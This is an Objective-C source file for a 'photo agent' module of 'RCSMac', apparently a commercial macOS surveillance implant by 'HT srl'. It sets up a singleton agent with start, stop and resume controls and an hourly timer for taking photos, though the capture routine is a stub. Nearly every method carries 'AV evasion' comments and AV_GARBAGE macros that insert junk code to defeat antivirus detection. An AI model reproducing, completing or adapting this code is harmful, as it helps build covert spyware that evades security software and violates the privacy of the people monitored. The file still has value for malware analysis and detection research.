/*
 * RCSMAgentPhoto.m
 * RCSMac
 * Photo Agent
 *
 *
 * Created by J on 27/05/2015
 * Copyright (C) HT srl 2015. All rights reserved
 *
 */


#import "RCSMAgentPhoto.h"
#import "RCSMCommon.h"
#import "RCSMGlobals.h"
#import "RCSMLogger.h"
#import "RCSMAVGarbage.h"



static __m_MAgentPhoto *sharedAgentPhoto = nil;

@interface __m_MAgentPhoto (private)


- (void) _getPhotoTimer:(NSTimer *)timer;
- (BOOL) _getPhoto;
- (void) _getMarkup;
- (void) _setMarkup;

@end

@implementation __m_MAgentPhoto (private)

- (void) _getMarkup
{
    markup = [[__m_MUtils sharedInstance] getPropertyWithName:[[self class] description]];
    if(markup==nil)
    {
        // markup not found, we allocate it
        markup = [NSMutableDictionary dictionaryWithCapacity: 1];
    }
}

- (void) _setMarkup
{
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    
    [[__m_MUtils sharedInstance] setPropertyWithName:[[self class] description]withDictionary:markup];
    
    [pool release];
}


- (void) _getPhotoTimer: (NSTimer *)timer
{
    [self _getPhoto];
}

- (BOOL) _getPhoto
{
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    [pool release];
    return YES;
}

@end


@implementation __m_MAgentPhoto

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

+ (__m_MAgentPhoto *)sharedInstance
{
    @synchronized(self)
    {
        if (sharedAgentPhoto == nil)
        {
            //
            // Assignment is not done here
            //
            [[self alloc] init];
        }
    }
    
    return sharedAgentPhoto;
}

+ (id)allocWithZone: (NSZone *)aZone
{
    @synchronized(self)
    {
        if (sharedAgentPhoto == nil)
        {
            sharedAgentPhoto = [super allocWithZone: aZone];
            
            //
            // Assignment and return on first allocation
            //
            return sharedAgentPhoto;
        }
    }
    
    // On subsequent allocation attemps return nil
    return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
    return self;
}

- (unsigned)retainCount
{
    // Denotes an object that cannot be released
    return UINT_MAX;
}

- (id)retain
{
    return self;
}

- (void)release
{
    // Do nothing
}

- (id)autorelease
{
    return self;
}

#pragma mark -
#pragma mark Agent Formal Protocol Methods
#pragma mark -


- (BOOL)stop
{
#ifdef DEBUG_PHOTO
    infoLog(@"module stopped");
#endif
    
    int internalCounter = 0;
    
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    [mConfiguration setObject: AGENT_STOP
                       forKey: @"status"];
    
    // AV evasion: only on release build
    AV_GARBAGE_001
    
    while (![[mConfiguration objectForKey: @"status"]  isEqual: AGENT_STOPPED]
           && internalCounter <= MAX_STOP_WAIT_TIME)
    {
        // AV evasion: only on release build
        AV_GARBAGE_004
        
        internalCounter++;
        usleep(100000);
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_005
    
    return YES;
}

- (void)start
{
    NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
    
#ifdef DEBUG_PHOTO
    infoLog(@"module started");
#endif
    
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    [mConfiguration setObject: AGENT_RUNNING forKey: @"status"];
    
    //[self _getMarkup];
    
    //first run
    [self _getPhotoTimer];
    
    NSRunLoop *currentRunLoop = [NSRunLoop currentRunLoop];
    
    // TODO: change timer interval
    NSTimer *timer = nil;
    timer = [NSTimer scheduledTimerWithTimeInterval: 3600 target:self selector:@selector(_getPhotoTimer:) userInfo:nil repeats:YES];
    [currentRunLoop addTimer: timer forMode: NSRunLoopCommonModes];
    
    while (![[mConfiguration objectForKey: @"status"] isEqual: AGENT_STOP]
           && ![[mConfiguration objectForKey: @"status"]  isEqual: AGENT_STOPPED])
    {
        NSAutoreleasePool *inner = [[NSAutoreleasePool alloc] init];
        
        // AV evasion: only on release build
        AV_GARBAGE_007
        
        if (gOSMajor == 10 && gOSMinor >= 6)
            [currentRunLoop runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
        else
            sleep(1);
        
        // AV evasion: only on release build
        AV_GARBAGE_005
        
        [inner release];
    }
    
    if (timer != nil)
    {
        [timer invalidate];
    }
    
    if ([[mConfiguration objectForKey: @"status"] isEqualToString: AGENT_STOP])
    {
        // AV evasion: only on release build
        AV_GARBAGE_006
        
        [mConfiguration setObject: AGENT_STOPPED
                           forKey: @"status"];
        
        // AV evasion: only on release build
        AV_GARBAGE_003
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    [outerPool release];
}


- (BOOL)resume
{
#ifdef DEBUG_PHOTO
    infoLog(@"module resumed");
#endif
    
    return YES;
}

#pragma mark -
#pragma mark Getter/Setter
#pragma mark -

- (NSMutableDictionary *)mConfiguration
{
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    return mConfiguration;
}

- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration
{
    // AV evasion: only on release build
    AV_GARBAGE_009
    
    if (aConfiguration != mConfiguration)
    {
        // AV evasion: only on release build
        AV_GARBAGE_000
        
        [mConfiguration release];
        
        // AV evasion: only on release build
        AV_GARBAGE_001
        
        mConfiguration = [aConfiguration retain];
    }
}

@end
